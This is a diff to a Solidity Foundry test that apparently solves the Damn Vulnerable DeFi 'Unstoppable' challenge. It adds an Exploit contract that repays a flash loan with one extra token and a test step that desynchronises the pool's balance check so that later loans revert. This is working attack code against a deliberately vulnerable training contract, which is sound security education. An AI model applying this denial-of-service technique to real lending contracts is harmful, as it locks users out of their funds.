@@ -4,9 +4,28 @@ pragma solidity >=0.8.0;
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
 import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
+
+contract Exploit {
+    UnstoppableLender private immutable pool;
+    error SenderMustBePool();
+
+    constructor(address poolAddress) {
+        pool = UnstoppableLender(poolAddress);
+    }
+
+    function receiveTokens(address tokenAddress, uint256 amount) external {
+        if (msg.sender != address(pool)) revert SenderMustBePool();
+        IERC20(tokenAddress).transfer(msg.sender, amount + 1);
+    }
+
+    function executeFlashLoan(uint256 amount) external {
+        pool.flashLoan(amount);
+    }
+}
 
 contract Unstoppable is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
@@ -49,13 +68,18 @@ contract Unstoppable is Test {
             address(unstoppableLender)
         );
         vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
-        receiverUnstoppable.executeFlashLoan(10);
+        receiverUnstoppable.executeFlashLoan(1);
         vm.stopPrank();
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        Exploit exploit = new Exploit(address(unstoppableLender));
+        dvt.transfer(address(exploit), 1);
+        exploit.executeFlashLoan(10);
+        vm.stopPrank();
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
